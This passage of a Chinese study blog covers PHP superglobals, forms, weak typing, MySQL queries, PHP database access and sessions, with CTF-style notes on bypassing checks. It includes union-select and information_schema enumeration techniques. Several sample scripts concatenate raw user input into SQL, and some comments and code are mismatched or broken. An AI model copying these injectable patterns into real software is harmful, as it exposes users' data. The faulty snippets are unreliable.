$_SERVER[&#39;HTTP_REFERER&#39;].&quot;&lt;br/&gt;&quot;;  //返回来自当前请求的host头    echo $_SERVER[&#39;HTTP_USER_AGENT&#39;].&quot;&lt;br/&gt;&quot;;//返回当前请求页面的上一个页面URL    echo $_SERVER[&#39;HTTP_NAME&#39;].&quot;&lt;br/&gt;&quot;;      //返回当前请求客户端的User-Agent    echo $_SERVER[&#39;HTTP_STRING&#39;].&quot;&lt;br/&gt;&quot;;    //返回获取查询语句，一般是问号后面的字符串?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/SWNFo5Pe9uKhxtX.png" alt="image-20210317192027470"></p><p><img src="https://i.loli.net/2021/03/17/NCdmWJTq4w8f6V5.png" alt="image-20210317192044223"></p><p>（5）$GLOBALS</p><ul><li>应用全局作用域中可用的全部变量</li><li>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</li></ul><pre><code class="php">&lt;?php    $_ =&quot;123456&quot;;    $a =&quot;&lt;br&gt;hello&quot;;    $b =&quot;&lt;br&gt;world&quot;;    echo $GLOBALS[&#39;_&#39;];    echo $GLOBALS[&#39;a&#39;];    echo $GLOBALS[&#39;b&#39;];    var_dump($GLOBALS) //查看$GLOBALS的类型和值    $GLOBALS[&#39;_GET&#39;] //获取超全局变量中_GET的变量,相当于$_GET    $GLOBALS[&#39;_GET&#39;][&#39;username&#39;] //获取前端以GET形式传输的username的值?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/J2txUnQHCuf36j7.png" alt="image-20210317192914226"></p><p>扩展：CTF中如何绕过判断：</p><pre><code class="php">//输入你想要的变量，$flag$want = $_GET[&#39;want&#39;];// $want=GLOBALS[&#39;flag&#39;]绕过if语句if($want==&#39;flag&#39;)&#123;    die(&quot;hacker!&quot;);&#125;else&#123;    echo $$want;    //GLOBALS[&#39;flag&#39;]&#125;//$want 利用正则表达式//want = flag</code></pre><h3 id="PHP表单处理"><a href="#PHP表单处理" class="headerlink" title="PHP表单处理"></a>PHP表单处理</h3><p>PHP超全局变量$_GET和$_POST用于收集表单数据（form-data）</p><ul><li>form.html</li></ul><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;/&gt;        &lt;title&gt;goktech&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;form action=&quot;form.php&quot; method=&quot;POST&quot;&gt;        姓名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br/&gt;        电邮：&lt;input type=&quot;text&quot; name=&quot;email&quot;&gt;&lt;br/&gt;        &lt;input type=&quot;submit&quot;&gt;    &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><ul><li>form.php</li></ul><pre><code class="php">&lt;meta charset=&quot;utf-8&quot;&gt;&lt;?php    $name=$_POST[&#39;name&#39;];    $email=$_POST[&#39;email&#39;];    echo &quot;Welcome &quot;,$name;    echo &quot;&lt;br&gt;&quot;;    echo &quot;Your email is &quot;,$email;//将用户名和电邮保存在数据库中    //1.构造SQL语句    //INSERT INTO user (username,email) VALUES (&quot;xxx&quot;,&quot;xxx&quot;) 将两个xxx看作是变量，第一个xxx前的内容看作一个字符串，两个xxx之间的内容为一个字符串，第二个xxx后的内容看作是一个字符串。    //PHP拼接符&quot;.&quot;    //$a定义变量a    $sql=&#39;INSERT INTO user (username,email) VALUES (&quot;&#39;.$name.&#39;&quot;,&quot;&#39;.$email.&#39;&#39;&quot;)&#39;;或者不用连接符：    $sql=&quot;INSERT INTO user (username,email) VALUES (&#39;$name&#39;,&#39;$email&#39;)&quot;;    //2.使用PHP去向数据库进行查询，查询的内容就位构造好的SQL语句    header(&quot;Content-Type:text/html;charset=UTF-8&quot;);     //解决中文乱码?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/4IPyNqHUoCFzpEK.png" alt="image-20210318095619457"></p><p><img src="https://i.loli.net/2021/03/18/jYD3WQx45qdVewb.png" alt="image-20210318095636257"></p><h3 id="PHP数据类型"><a href="#PHP数据类型" class="headerlink" title="PHP数据类型"></a>PHP数据类型</h3><p>（1）PHP数据类型分为：字符串、整数、浮点数、逻辑、数组、对象、NULL。</p><p>（2）PHP字符串：</p><ul><li>字符串是字符序列，比如“Hello world!”。</li><li>字符串可以是引号内的任何文本。可以使用单引号或双引号</li></ul><p>（3）PHP整数；可以用三种格式规定整数：十进制、十六进制(前缀是0x)或八进制(前缀是0)</p><p>（4）var_dump()会返回变量的数据类型和值</p><pre><code class="php">&lt;?php$x=666;$y=0x8c;   //十六进制数$z=047;    //八进制数var_dump($x);var_dump($y);var_dump($z);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/KeEHsqhbv43xl6y.png" alt="image-20210318100414764"></p><p>扩展:ctf如何绕过判断：</p><pre><code class="php">//$want = 0x01 ，利用十六进制绕过if($want === 1)&#123;    die(&quot;try!&quot;);&#125;else&#123;    if($want == 1)&#123;        echo $flag;时        //$want等于1    &#125;    else&#123;        die(&quot;hacker!&quot;);    &#125;&#125;</code></pre><p>（5）PHP浮点数：浮点数是有小数点或指数形式的数字。float类型数据强制转换为int类型数据时会造成溢出。</p><pre><code class="php">&lt;?php$x=11.123;$y=2.4e3;$z=8e-5;var_dump($x);var_dump($y);var_dump($z);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/1QAOSYM6mHVgoUC.png" alt="image-20210318103306580"></p><p>（6）PHP数组：</p><ul><li>数组能够在单独的变量名中存储一个或多个值。</li><li>在PHP中，array()函数用于创建数组</li><li>在PHP中，有三种数组类型：</li></ul><pre><code>索引数组-带有数字索引的数组关联数组-带有指定键的数组多维数组-包含一个或多个数组的数组</code></pre><ul><li>获得数组的长度-count()函数：用于返回数组的长度（元素数）</li></ul><p>（7）PHP索引数组：带有数字索引的数组</p><pre><code class="php">&lt;?php$shuiguo=array(&quot;苹果&quot;,&quot;香蕉&quot;,&quot;西瓜&quot;);echo $shuiguo[0],$shuiguo[1],$shuiguo[2];$len=count($shuiguo);echo &quot;&lt;br/&gt;&quot;;echo $len.&quot;&lt;br/&gt;&quot;;for ($i=0;$i&lt;$len;$i++)&#123;     //遍历索引数组    echo $shuiguo[$i];&#125;header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/CuixX4ZEo5sMD9B.png" alt="image-20210318132313725"></p><p>（8）PHP关联数组：带有指定键的数组</p><pre><code class="php">&lt;?php$shuiguo=array(&quot;苹果&quot;=&gt;&quot;3&quot;,&quot;香蕉&quot;=&gt;&quot;5&quot;,&quot;西瓜&quot;=&gt;&quot;9&quot;);foreach($shuiguo as $x=&gt;$y)&#123;     //用foreach遍历关联数组    echo $x.&quot;--&gt;&quot;.$y;    echo &quot;&lt;br/&gt;&quot;;&#125;header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/6Fz2cg7T3HkYZX5.png" alt="image-20210318132830706"></p><h3 id="PHP函数"><a href="#PHP函数" class="headerlink" title="PHP函数"></a>PHP函数</h3><p>（1）PHP拥有超过1000个内建函数</p><p>（2）PHP默认参数值。以下例子展示了如何使用默认参数。若调用自定义的没有参数的setHeight()函数，它的参数会取默认值50。</p><pre><code class="php">&lt;?phpfunction setHeight($minheight=50)&#123;    echo &quot;高度是：$minheight &lt;br/&gt;&quot;;&#125;setHeight(350);setHeight();setHeight(135);header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/isdQgbrCOHAp2lL.png" alt="image-20210318133544243"></p><pre><code class="php">&lt;?phpfunction sum($x,$y)&#123;    $z=$x+$y;    return $z;      //return定义函数返回值&#125;echo &quot;5 + 7 =&quot;.sum(5,7).&quot;&lt;br/&gt;&quot;;echo &quot;6 + 6 =&quot;.sum(6,6).&quot;&lt;br/&gt;&quot;;header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/ihD1SGJaCnFcV5e.png" alt="image-20210318134041089"></p><h3 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h3><p>（1）PHP是一门类型松散的语言——弱类型</p><ul><li>在定义PHP变量时不必告知变量的数据类型</li><li>不同数据类型在比较时会发生强制类型转换，PHP根据它的值，自动把变量转换为正确的数据类型。</li></ul><p>（2）PHP的两种比较运算符”==”和”===”</p><ul><li>==等于符号，比较时，会先转换成相同的数据类型，然后比较值。</li><li>===全等于符号，比较时，先比较数据类型是否相同，然后比较值</li></ul><pre><code class="php">&lt;?php$x=NULL;$y=0;$z=&quot;abc&quot;;var_dump($x == $y);   //NULL和整数0，trueecho &quot;&lt;br/&gt;&quot;;         var_dump($x == $z);   //NULL和字符串，falseecho &quot;&lt;br/&gt;&quot;;var_dump($y == $z);   //整数0和字符串，trueecho &quot;&lt;br/&gt;&quot;;echo &quot;&lt;br/&gt;&quot;;var_dump($x === $y);  //NULL和整数0，falseecho &quot;&lt;br/&gt;&quot;;var_dump($x === $z);  //NULL和字符串，falseecho &quot;&lt;br/&gt;&quot;;var_dump($y === $z);  //整数0和字符串，falseecho &quot;&lt;br/&gt;&quot;;header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/yGCsctegp4BKAj7.png" alt="image-20210318135601549"></p><p>（3）0e字符串和0x字符串比较时：</p><ul><li>若字符串是0e类型，PHP会将其解析为科学计数法</li><li>若字符串是0x类型，PHP会将其解析为十六进制</li></ul><pre><code class="php">&lt;?php$a=1.23e+3;$b=&quot;1.23e+3&quot;;$c=0x4c;$d=&quot;0x4c&quot;;echo $a.&quot;&lt;br/&gt;&quot;;echo $b.&quot;&lt;br/&gt;&quot;;echo $c.&quot;&lt;br/&gt;&quot;;echo $d.&quot;&lt;br/&gt;&quot;;echo &quot;&lt;br/&gt;&quot;;var_dump($a == $b);echo &quot;&lt;br/&gt;&quot;;var_dump($c == $d);header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/sTgKS3Rov7jENAz.png" alt="image-20210318141329399"></p><h2 id="SQL的进阶语法"><a href="#SQL的进阶语法" class="headerlink" title="SQL的进阶语法"></a>SQL的进阶语法</h2><h3 id="数据库系统"><a href="#数据库系统" class="headerlink" title="数据库系统"></a>数据库系统</h3><p>（1）数据库：长期存储在计算机内的、有组织的、可共享的数据集合。</p><p>（2）DBMS(DataBase Management System)</p><ul><li>一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库</li><li>它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性</li><li>常见的DBMS包括access、SQLserver、mysql、oracle、DB2等</li></ul><p><img src="https://i.loli.net/2021/03/18/fv8WpUEh1g2FZje.png" alt="image-20210318142031864"></p><h3 id="基础查询语句"><a href="#基础查询语句" class="headerlink" title="基础查询语句"></a>基础查询语句</h3><p>（1）select * from admin;</p><ul><li>select语句用于从表中选取数据，结果被存储在一个结果表中(称结果集)。以下例子说明admin表中有id，role，username，password，city，age这6列，共5行。</li></ul><p><img src="https://i.loli.net/2021/03/18/XKT8ZW5nowuz2Cp.png" alt="image-20210318150151954"></p><ul><li>如需有条件地从表中选取数据，可将where子句添加到select语句中。</li></ul><p><img src="https://i.loli.net/2021/03/18/VLYn6PwCyrMcDuh.png" alt="image-20210318150401661"></p><p>（2）AND &amp; OR运算符</p><ul><li>AND和OR运算符用于根据多个条件筛选记录。AND优先级高于OR。</li><li>若AND分隔的所有条件为true，则AND运算符显示记录</li></ul><p><img src="https://i.loli.net/2021/03/18/nDVuwvXOTZriCsQ.png" alt="image-20210318151451097"></p><ul><li>若有OR分隔的任何条件为真，则OR运算符显示记录</li></ul><p><img src="https://i.loli.net/2021/03/18/sTIqZpc6YixnH81.png" alt="image-20210318151556785"></p><p>（3）order by排序：默认情况下按升序排序记录</p><p><img src="https://i.loli.net/2021/03/18/kYPTKGzq6fjFAXm.png" alt="image-20210318152040641"></p><ul><li>执行select * from admin order by 6;（按照第6列进行排序，效果同上）</li><li>若列数超出则会报错</li></ul><p><img src="https://i.loli.net/2021/03/18/tg4IJm9X1CvwRT8.png" alt="image-20210318152204167"></p><p>（4）MySQL支持limit子句，用以取回有限数量的记录。</p><p>（5）从第n行开始，显示后面m行：limit n,m （或者limit m offset n）。</p><ul><li>从第0行开始，显示后面1行</li></ul><p><img src="https://i.loli.net/2021/03/18/ZOFJn6rRpVqc2md.png" alt="image-20210318152654793"></p><ul><li>从第2行开始，显示后面3行</li></ul><p><img src="https://i.loli.net/2021/03/18/tQ9UWLkdE3FzsmI.png" alt="image-20210318152726593"></p><p>（6）count(*)查询，返回记录的个数</p><pre><code class="sql">SELECT count(*) FROM `test` WHERE City=&#39;Hangzhou&#39; AND Country=&#39;China&#39;;</code></pre><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>UNION运算符用于组合两个或更多select语句的结果集。</p><ul><li>这些列必须具有相似的数据类型</li><li>每个select语句中的列也必须以相同的顺序排列</li></ul><p><img src="https://i.loli.net/2021/03/18/52lJFVIcEN6La9y.png" alt="image-20210318153258170"></p><ul><li>union查询会按照select的顺序显示结果集</li><li>当不知道另一张表aadmin时，可借助mysql的弱类型达到构造union语句。</li></ul><pre><code class="sql">select * from admin union select 1,2,3,4,5,6;</code></pre><h3 id="SELECT子句"><a href="#SELECT子句" class="headerlink" title="SELECT子句"></a>SELECT子句</h3><p>（1）select查询的结果可作为另一个select查询的列的结果。</p><p>（2）这种查询方式属于SQL子查询的一种。</p><p><img src="https://i.loli.net/2021/03/18/7bKJSaygOLYXlIm.png" alt="image-20210318154404839"></p><h3 id="基本建表和增删改语句"><a href="#基本建表和增删改语句" class="headerlink" title="基本建表和增删改语句"></a>基本建表和增删改语句</h3><p>（1)CREATE 用来建表，格式如下</p><pre><code class="sql">create table 表名称 (列名称1 数据类型,列名称2 数据类型,列名称3 数据类型,...);</code></pre><p>例如新建一张表test，插入3个列分别为id，username，password</p><pre><code class="sql">create table test (id int,username varchar(255),password varchar(255));</code></pre><p>（2）INSERT用来增加一条记录</p><pre><code class="sql">insert into test (id,username,password) values(1,&#39;admin&#39;,&#39;admin123&#39;);</code></pre><p>（3）UPDATE用来修改一条记录</p><pre><code class="sql">update test set username=&#39;admin_A&#39;,password=&#39;admin321&#39; where username=&#39;admin&#39;;</code></pre><p>（4）DELETE用来删除一条记录</p><pre><code class="sql">delete from test where username=&#39;admin_A&#39;;</code></pre><h3 id="MySQL数据库中设置属性为自增属性"><a href="#MySQL数据库中设置属性为自增属性" class="headerlink" title="MySQL数据库中设置属性为自增属性"></a>MySQL数据库中设置属性为自增属性</h3><pre><code class="sql">--+设置users表中的id属性为自增属性alter table users change id id int not null auto_increment primary key; --+设置users表中的自增属性从指定的1004开始自增，该命令可根据需要重复使用alter table users auto_increment = 1004;--+MySQL中删除主键需要执行两步命令.--+一、有auto_increment自增属性的，先删除自增；--+二、删除主键约束 primary key，完成--+删除id的auto_increment自增属性。alter table users change id id int;--+然后删除id的primary key主键约束.alter table users drop primary key;</code></pre><h3 id="数据库管理系统的内置数据库"><a href="#数据库管理系统的内置数据库" class="headerlink" title="数据库管理系统的内置数据库"></a>数据库管理系统的内置数据库</h3><p>（1）MySQL有一个默认的内置数据库，信息数据库information_schema</p><p>（2）information_schema有三张关键的表：schemata、tables、columns</p><p>（3）schemata表的schema_name列存放的是所有的数据库名</p><pre><code class="sql">select schema_name from information_schema.schemata;或者使用show databases;</code></pre><p><img src="https://i.loli.net/2021/03/18/F1XeAcMPWNJpgiv.png" alt="image-20210318160004813"></p><p><img src="https://i.loli.net/2021/03/18/dQupgmRqYFH1jVK.png" alt="image-20210318160139745"></p><p>（4）MySQL有一个默认的内置数据库，信息数据库information_schema。</p><p>（5）information_schema有三张关键的表：schemata、tables、columns。</p><p>（6）tables表的table_schema列存放的是所有的数据库名，table_name列存放的是数据库对应的所有表名。</p><ul><li>如要查询数据库mysql的所有表名。</li></ul><pre><code class="sql">select table_name from information_schema.tables where table_schema=&#39;mysql&#39;;或者也可以use mysql;   //进入或使用mysql数据库show tables; //查询数据库mysql的所有表名</code></pre><p><img src="https://i.loli.net/2021/03/18/1682TjYsrg4ZwLz.png" alt="image-20210318160929363"></p><p>（7）columns表的column_name列存放的是所有的列名，table_schema列存放的是数据库对应的所有数据库名，table_name列存放的是数据库对应的所有数据库表名。</p><ul><li>如要查询数据库mysql的user表的所有列</li></ul><pre><code class="sql">select column_name from information_schema.columns where table_schema=&#39;mysql&#39; and table_name=&#39;user&#39;;</code></pre><p><img src="https://i.loli.net/2021/03/18/TWgM79RIdoE8HQG.png" alt="image-20210318162436206"></p><h3 id="数据库管理系统的内置函数"><a href="#数据库管理系统的内置函数" class="headerlink" title="数据库管理系统的内置函数"></a>数据库管理系统的内置函数</h3><p>（1）不同的DBMS有各自专属的内置函数，以下是mysql常见的一些内置函数：</p><ul><li>user()查看当前数据库账号的用户名。</li></ul><pre><code class="sql">select user();</code></pre><p><img src="https://i.loli.net/2021/03/18/URcaVqTSufPL3MB.png" alt="image-20210318162714816"></p><ul><li>version()查看当前数据库的版本。</li></ul><pre><code class="sql">select version();</code></pre><p><img src="https://i.loli.net/2021/03/18/KPrsadqNOCEYGvm.png" alt="image-20210318162832065"></p><ul><li>database()查看当前所在查询的数据库名。</li></ul><pre><code class="sql">use dvwa;        //进入数据库dvwaselect database();</code></pre><p><img src="https://i.loli.net/2021/03/18/8neVsDGyQMBiCbo.png" alt="image-20210318163032842"></p><ul><li>@@datadir查看当前数据库所在物理路径</li></ul><pre><code class="sql">select @@datadir;</code></pre><p><img src="https://i.loli.net/2021/03/18/dWr5xZLaBMt3gve.png" alt="image-20210318163155843"></p><ul><li>sleep(n)睡眠函数，运行n秒后返回结果。</li></ul><pre><code class="sql">select sleep(5);</code></pre><p><img src="https://i.loli.net/2021/03/18/12GpoYXVtqlrhkU.png" alt="image-20210318163426515"></p><ul><li>length()返回结果长度。</li></ul><pre><code class="sql">select length(&quot;admin&quot;);</code></pre><p><img src="https://i.loli.net/2021/03/18/pt8kxOaDSic4neG.png" alt="image-20210318163540873"></p><ul><li>substr(str,n,m)截取函数，从第n位开始截取m。</li></ul><pre><code class="sql">select substr(&quot;admin&quot;,2,3);</code></pre><p><img src="https://i.loli.net/2021/03/18/azWsL38ognlNjA1.png" alt="image-20210318163706953"></p><ul><li>if(expr,r1,r2)判断函数，expr条件为真返回r1，为假返回r2。</li></ul><pre><code class="sql">select if((1&gt;2),111,222);</code></pre><p><img src="https://i.loli.net/2021/03/18/KEAGFgyRhPWUjeZ.png" alt="image-20210318163855411"></p><ul><li>ord()返回一个字符的ASCII码</li></ul><pre><code class="sql">select ord(&#39;a&#39;);</code></pre><p><img src="https://i.loli.net/2021/03/18/f9XRdjrSKckml8Z.png" alt="image-20210318180058349"></p><ul><li>hex()返回一个字符的16进制，相反是unhex()。</li></ul><pre><code class="sql">select hex(&#39;a&#39;);</code></pre><p><img src="https://i.loli.net/2021/03/18/dXyhmpuAeQwUPcn.png" alt="image-20210318180229154"></p><ul><li>char()根据ASCII返回对应的字符</li></ul><pre><code class="sql">select char(97);</code></pre><p><img src="https://i.loli.net/2021/03/18/hPxKMdlTXVtbIic.png" alt="image-20210318180334990"></p><ul><li>bin()返回一个数的2进制</li></ul><pre><code class="sql">select bin(7);</code></pre><p><img src="https://i.loli.net/2021/03/18/HFRDXcQs4Gnygkt.png" alt="image-20210318180438798"></p><p>（2）concat()用于将多个字符串连接成一个字符串，多列成1列</p><pre><code class="sql">select user_id,&#39;---&#39;,user from users limit 0,1;</code></pre><p><img src="https://i.loli.net/2021/03/18/cTN87vnRX9W36Y5.png" alt="image-20210318181041151"></p><pre><code class="sql">select concat(user_id,&#39;---&#39;,user) from users limit 0,1;</code></pre><p><img src="https://i.loli.net/2021/03/18/uX68S9IN7AOx5ik.png" alt="image-20210318181128328"></p><p>（3）group_concat()用于返回字符串的所有结果，该结果由分组的值连接而成。</p><pre><code class="sql">select user_id,&#39;---&#39;,user from users limit 0,1;</code></pre><p><img src="https://i.loli.net/2021/03/18/cTN87vnRX9W36Y5.png" alt="image-20210318181041151"></p><pre><code class="sql">select group_concat(user_id,&#39;---&#39;,user)from users limit 0,1;</code></pre><p><img src="https://i.loli.net/2021/03/18/FJlRm1ha4uKiNCv.png" alt="image-20210318181515127"></p><h2 id="使用PHP管理SQL"><a href="#使用PHP管理SQL" class="headerlink" title="使用PHP管理SQL"></a>使用PHP管理SQL</h2><h3 id="PHP管理数据库"><a href="#PHP管理数据库" class="headerlink" title="PHP管理数据库"></a>PHP管理数据库</h3><p>（1）在不使用PHP的情况下，管理数据库的基本步骤：连接数据库-&gt;选择数据库-&gt;选择表-&gt;查询SQL语句</p><p><img src="https://i.loli.net/2021/03/18/NrBHuAIcLE8hapj.png" alt="image-20210318184524764"></p><p>（2）PHP连接数据库函数——mysqli_connect(servername,user,pass,database)</p><ul><li>servername：数据库地址</li><li>user：数据库用户名</li><li>pass：数据库密码</li><li>database：数据库名</li></ul><pre><code class="php">&lt;?php$con =mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;dvwa&quot;);if(!$con)&#123;    die(&#39;连接失败：&#39;.mysqli_connect_error());&#125;else&#123;    echo &quot;连接成功&quot;;&#125;mysqli_close($con);header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/Kikf8S9ap1l5Jbu.png" alt="image-20210318185742335"></p><pre><code class="php">mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;test&quot;)//连接数据库</code></pre><p><strong>扩展</strong>：可在相同路径下新建一个database.inc.php文件，用于存放需要传入的参数。然后通过<strong>include</strong>来调用。</p><pre><code class="php">//database.inc.php文件&lt;?php    $dbserver = &quot;127.0.0.1&quot;;    $dbuser = &quot;root&quot;;    $dbpass = &quot;root&quot;;    $dbdatabase = &quot;test&quot;;    mysqli_connect($dbserver,$dbuser,$dbpass,$dbdatabase);?&gt;</code></pre><pre><code class="php">&lt;?php    include &quot;database.inc.php&quot;;?&gt;</code></pre><p>（3）查询:PHP执行SQL语句函数——mysqli_query(conn,sql)</p><ul><li>conn：数据库连接函数的结果</li><li>sql：SQL语句</li></ul><pre><code class="php">&lt;?php$con =mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;dvwa&quot;);if(!$con)&#123;    die(&#39;连接失败：&#39;.mysqli_connect_error());&#125;else&#123;    echo &quot;连接成功&lt;hr&gt;&quot;;&#125;$sql=&quot;select * from users limit 0,1&quot;;$result=mysqli_query($con,$sql);var_dump($result);mysqli_close($con);header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/tJcBy8beNTHK3qw.png" alt="image-20210318190457387"></p><p><strong>扩展</strong>：可在相同路径下新建一个database.inc.php文件，用于存放需要传入的参数。然后通过<strong>include</strong>来调用。</p><pre><code class="php">//database.in.php文件&lt;?php    $dbserver = &quot;127.0.0.1&quot;;    $dbuser = &quot;root&quot;;    $dbpass = &quot;root&quot;;    $dbdatabase = &quot;test&quot;;    $con = mysqli_connect($dbserver,$dbuser,$dbpass,$dbdatabase);?&gt;</code></pre><pre><code class="php">&lt;?php    include &quot;database.inc.php&quot;;    $query = mysqli_query($con,$sql);?&gt;</code></pre><p>（4）PHP获取执行结果函数——mysqli_fetch_array(query)</p><ul><li>query：执行SQL语句函数的结果</li><li>mysqli_num_rows(query)：获取结果数组长度</li></ul><pre><code class="php">&lt;?php$con =mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;dvwa&quot;);$sql=&quot;select * from users limit 0,1&quot;;$result=mysqli_query($con,$sql);if(@mysqli_num_rows($result)&gt;0)&#123;       //加@符可避免报错    $row=mysqli_fetch_array($result);    echo $row[&#39;user_id&#39;].&quot;&lt;br/&gt;&quot;;    echo $row[&#39;first_name&#39;].&quot;&lt;br/&gt;&quot;;    echo $row[&#39;last_name&#39;].&quot;&lt;br/&gt;&quot;;    echo $row[&#39;user&#39;].&quot;&lt;br/&gt;&quot;;    echo $row[&#39;password&#39;].&quot;&lt;br/&gt;&quot;;&#125;mysqli_close($con);header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/Ft8EG4y12QASzfR.png" alt="image-20210318192511897"></p><p><strong>扩展</strong>：根据用户输入用户名和密码判断是否正确，进行数据库操作</p><ul><li>login.html文件</li></ul><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;form action=&quot;login.php&quot; method=&quot;get&quot;&gt;            City:            &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;            &lt;br&gt;            Country:            &lt;input type=&quot;text&quot; name=&quot;password&quot;&gt;            &lt;br&gt;            &lt;input type=&quot;submit&quot; value=&quot;查询&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><ul><li>login.php文件</li></ul><pre><code class="php">&lt;?php    $user = $_GET[&#39;username&#39;];    $pass = $_GET[&#39;password&#39;];    $sql = &quot;select * from test where City=&#39;&quot;.$user.&quot;&#39; and Country=&#39;&quot;.$pass.&quot;&#39;&quot;;    include &quot;database.inc.php&quot;;    $query = mysqli_query($con,$sql);    $result = mysqli_fetch_array($query);    var_dump($result)    echo &quot;&lt;br&gt;&quot;;    echo $result[&#39;CompanyName&#39;];?&gt;</code></pre><ul><li>database.inc.php文件</li></ul><pre><code class="php">&lt;?php    $dbserver = &quot;127.0.0.1&quot;;    $dbuser = &quot;root&quot;;    $dbpass = &quot;root&quot;;    $dbdatabase = &quot;test&quot;;    $con = mysqli_connect($dbserver,$dbuser,$dbpass,$dbdatabase);    function query($con,$sql)&#123;        mysqli_query($con,$sql);    &#125;?&gt;</code></pre><h3 id="根据用户查询返回结果展示"><a href="#根据用户查询返回结果展示" class="headerlink" title="根据用户查询返回结果展示"></a>根据用户查询返回结果展示</h3><pre><code class="php">&lt;?php$con =mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;dvwa&quot;);if(!$con)&#123;    die(&#39;连接失败：&#39;.mysqli_connect_error());&#125;$id=$_GET[&#39;user_id&#39;];$sql =&quot;select * from `users` where user_id=$id&quot;;    //其中users不是用单引号括住，而是用` `$result=mysqli_query($con,$sql);if(mysqli_num_rows($result)&gt;0)&#123;    $row=mysqli_fetch_array($result);    echo &quot;您查询的用户名是： &quot;.$row[&#39;user&#39;].&quot;&lt;br/&gt;&quot;;    echo &quot;您查询的用户名密码是： &quot;.$row[&#39;password&#39;];&#125;mysqli_close($con);header(&quot;Content-Type:text/html;charset=utf-8&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/18/GEd5cH3gzv9h2Ne.png" alt="image-20210318195520342"></p><h2 id="PHP的会话与权限管理"><a href="#PHP的会话与权限管理" class="headerlink" title="PHP的会话与权限管理"></a>PHP的会话与权限管理</h2><h3 id="Cookie和会话Session"><a href="#Cookie和会话Session" class="headerlink" title="Cookie和会话Session"></a>Cookie和会话Session</h3><p>（1）cookie用来管理服务器和客户之间的状态。</p><ul><li>cookie的工作机制是<strong>用户识别及状态管理</strong></li><li>web网站为了管理用户的状态，会通过web浏览器，把一些数据临时写入用户的计算机内。当用户访问该web网站时，可通过通信方式取回之前发放的cookie。</li></ul><p>（2）session会在cookie中出现和传输，属于cookie的一部分</p><ul><li>当web服务器开启会话机制时，用户登录成功后，会将<strong>会话保存在服务器中</strong></li><li>PHPSESSID–php session id–存放某串session</li><li>session可在浏览器中用f12打开开发者工具–&gt;Application–&gt;Cookie查看</li></ul><h3 id="PHP-Cookie"><a href="#PHP-Cookie" class="headerlink" title="PHP Cookie"></a>PHP Cookie</h3><p>（1）下发cookie函数：Setcookie()</p><ul><li>服务端会通过http响应包的set-cookie为浏览器分配cookie字段。</li></ul><pre><code class="php">&lt;?phpsetcookie(&quot;user&quot;,&quot;reborn&quot;,time()+3600);header(&quot;Content-Type:text/html;charset=utf-8&quot;);//创建名为“user”的cookie，并为它赋值“reborn”//规定此cookie在一小时后过期?&gt;</code></pre><p>（2）取回cookie的值</p><ul><li>PHP的$_COOKIE变量用于取回cookie的值</li></ul><pre><code class="php">&lt;?php    echo $_COOKIE[&quot;user&quot;];    //取回cookie的值    print_r($_COOKIE);        //查看所有cookie的方法?&gt;</code></pre><p>（3）删除cookie</p><ul><li>删除cookie时，应当使过期日期变更为过去的时间点</li></ul><pre><code class="php">&lt;?php    setcookie(&quot;user&quot;,&quot;&quot;,time()-3600);    //将过期数据设置为一小时前?&gt;</code></pre><h3 id="PHP-Sessions"><a href="#PHP-Sessions" class="headerlink" title="PHP Sessions"></a>PHP Sessions</h3><p>PHP开启会话函数：session_start()</p><ul><li>session_start()函数必须位于&lt;html&gt;标签之前</li></ul><pre><code class="html">&lt;?php session_start(); ?&gt;&lt;html&gt;    &lt;body&gt;        ......    &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="存储PHP-Session"><a href="#存储PHP-Session" class="headerlink" title="存储PHP Session"></a>存储PHP Session</h3><p>存储记录Session：$_SESSION</p><pre><code class="php">&lt;?php    session_start();    $_SESSION[&#39;login_id&#39;]=1003;    $_SESSION[&#39;role&#39;]=&quot;student&quot;;?&gt;</code></pre><h3 id="终结PHP-Session"><a href="#终结PHP-Session" class="headerlink" title="终结PHP Session"></a>终结PHP 